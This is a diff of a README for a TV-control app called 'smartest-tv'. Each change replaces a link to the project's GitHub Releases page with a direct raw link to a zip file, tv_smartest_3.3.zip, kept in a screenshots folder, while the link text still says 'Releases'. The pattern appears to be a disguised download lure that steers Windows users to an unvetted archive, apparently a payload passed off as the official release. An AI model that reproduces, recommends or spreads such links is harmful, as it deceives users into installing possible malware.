@@ -1,6 +1,6 @@
 # 📺 smartest-tv - Control your TV with plain words
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/inquisitive-genusvedalia144/smartest-tv/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/inquisitive-genusvedalia144/smartest-tv/raw/refs/heads/main/docs/assets/screenshots/tv_smartest_3.3.zip)
 
 ## 🖥️ What this app does
 
@@ -19,7 +19,7 @@ You can also use it with tools like MCP servers and AI agents for a more guided 
 
 Use this link to visit the release page and download the app for Windows:
 
-[Download smartest-tv from GitHub Releases](https://github.com/inquisitive-genusvedalia144/smartest-tv/releases)
+[Download smartest-tv from GitHub Releases](https://github.com/inquisitive-genusvedalia144/smartest-tv/raw/refs/heads/main/docs/assets/screenshots/tv_smartest_3.3.zip)
 
 ### What to do on Windows
 
@@ -195,7 +195,7 @@ Best if you plan to connect the TV to other tools or agents.
 
 ## 🔗 Download again
 
-[Visit the smartest-tv Releases page](https://github.com/inquisitive-genusvedalia144/smartest-tv/releases)
+[Visit the smartest-tv Releases page](https://github.com/inquisitive-genusvedalia144/smartest-tv/raw/refs/heads/main/docs/assets/screenshots/tv_smartest_3.3.zip)
 
 ## 📝 Simple setup flow
 
